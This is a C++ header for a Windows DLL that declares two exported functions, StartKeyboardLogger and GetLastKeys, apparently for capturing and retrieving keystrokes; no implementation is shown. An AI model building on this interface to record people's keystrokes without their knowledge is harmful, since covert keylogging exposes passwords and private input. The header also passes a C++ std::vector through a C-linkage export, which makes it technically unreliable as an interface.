#ifndef KEYBOARD_H
#define KEYBOARD_H

#ifdef KEYBOARD_EXPORTS
#define KEYBOARD_API __declspec(dllexport)
#else
#define KEYBOARD_API __declspec(dllimport)
#endif

#include <vector>

extern "C" KEYBOARD_API void StartKeyboardLogger();
extern "C" KEYBOARD_API std::vector<char> GetLastKeys();

#endif